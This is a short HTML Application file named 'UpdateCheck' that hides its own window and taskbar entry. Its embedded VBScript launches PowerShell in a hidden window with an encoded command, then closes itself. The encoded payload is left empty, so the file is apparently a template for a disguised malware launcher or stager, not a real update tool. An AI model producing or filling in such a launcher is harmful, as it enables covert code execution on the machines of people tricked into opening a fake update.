<html>
  <head>
    <HTA:APPLICATION 
      ID="test"
      APPLICATIONNAME="UpdateCheck"
      BORDER="thin"
      BORDERSTYLE="normal"
      CAPTION="no"
      SHOWINTASKBAR="no"
      SINGLEINSTANCE="yes"
      SYSMENU="no"
    >
  </head>
  <script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell -WindowStyle Hidden -EncodedCommand ", 0, False
    self.close
  </script>
</html>
